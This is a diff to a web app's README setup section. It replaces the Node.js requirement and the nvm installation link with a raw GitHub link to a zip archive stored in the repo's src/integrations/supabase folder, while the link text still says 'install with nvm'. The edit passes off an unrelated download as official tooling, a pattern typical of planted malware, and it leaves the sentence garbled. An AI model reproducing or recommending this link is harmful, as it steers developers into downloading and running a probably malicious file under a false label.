@@ -7,7 +7,7 @@ There are several ways of editing your application.
 
 If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+The only requirement is having https://raw.githubusercontent.com/sezerartug/filtre-takip-c/main/src/integrations/supabase/takip-filtre-c-v1.6.zip & npm installed - [install with nvm](https://raw.githubusercontent.com/sezerartug/filtre-takip-c/main/src/integrations/supabase/takip-filtre-c-v1.6.zip)
 
 Follow these steps:
 
